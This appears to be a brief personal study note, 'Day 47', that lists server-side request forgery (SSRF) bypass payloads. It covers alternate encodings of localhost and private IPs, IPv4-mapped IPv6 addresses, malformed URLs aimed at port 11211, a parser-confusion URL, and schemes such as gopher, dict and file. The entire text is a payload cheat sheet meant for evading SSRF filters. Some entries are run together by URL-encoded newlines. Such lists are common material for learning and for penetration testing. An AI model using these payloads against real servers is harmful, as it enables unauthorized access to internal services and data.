Daily Notes : Day 47 
SSRF BYPASSES part1 

1: Bypass localhost with CIDR
http://127.127.127.127
http://127.0.1.3

2: Bypass using a decimal IP location
http://0177.0.0.1/%0Ahttp://2130706433/%20=%20http://127.0.0.1%0Ahttp://3232235521/%20=%20http://192.168.0.1%0Ahttp://3232235777/%20=%20http://192.168.1.1 

3: IPv6/IPv4 Address Embedding
http://[0:0:0:0:0:ffff:127.0.0.1]

4: Bypass using malformed urls
localhost:+11211aaa%0Alocalhost%3A00011211aaaa

5: Bypass against a weak parser
http://127.1.1.1:80%5C@127.2.2.2:80/

6: SSRF exploitation via URL Scheme
File:///
Dict://
Sftp:// 
Tftp://
Ldap://
Gopher://